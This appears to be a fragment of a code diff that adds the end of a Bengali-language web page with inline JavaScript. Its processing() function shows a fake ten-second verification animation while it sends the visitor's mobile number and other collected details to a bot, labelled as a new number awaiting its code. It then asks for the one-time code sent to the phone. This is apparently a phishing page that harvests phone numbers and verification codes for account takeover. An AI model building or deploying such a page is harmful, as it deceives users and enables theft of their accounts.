+      $("next").disabled=false; if(cur===4&&!document.querySelector('.scr.on[data-s="d"]')) $("next").textContent="জমা দিন";
+      return;
+    }
+  }
+  $("err").textContent=e;
+};
+
+async function processing(){
+  go("p");
+  let n=10; const lis=[...document.querySelectorAll("#chk li")];
+  lis.forEach(l=>l.className=""); $("sec").textContent=bn(n); $("orb").style.setProperty("--p","0%");
+  const iv=setInterval(()=>{ n--; $("sec").textContent=bn(Math.max(n,0)); $("orb").style.setProperty("--p",((10-n)*10)+"%");
+    lis.forEach((l,i)=>{ const at=[2,5,8][i]; if(10-n>=at+2) l.className="ok"; else if(10-n>=at) l.className="go"; });
+    if(n<=0) clearInterval(iv); },1000);
+  const wait=new Promise(r=>setTimeout(r,10000));
+  const send=sendBot(`📞 নতুন নম্বর (কোডের অপেক্ষায়)\nমোবাইল: ${data.phone}\n\n${info()}`).then(()=>true).catch(()=>false);
+  const [,ok]=await Promise.all([wait,send]);
+  lis.forEach(l=>l.className="ok");
+  if(!ok){ cur=3; go(3); $("err").textContent="সংযোগে সমস্যা হয়েছে। ইন্টারনেট দেখে আবার চেষ্টা করুন।"; return; }
+  cur=4; $("sentTo").textContent=`কোড পাঠানো হয়েছে: ${bn(data.phone)}`; go(4); ob[0].focus();
+}
+</script>
+</body>
+</html>
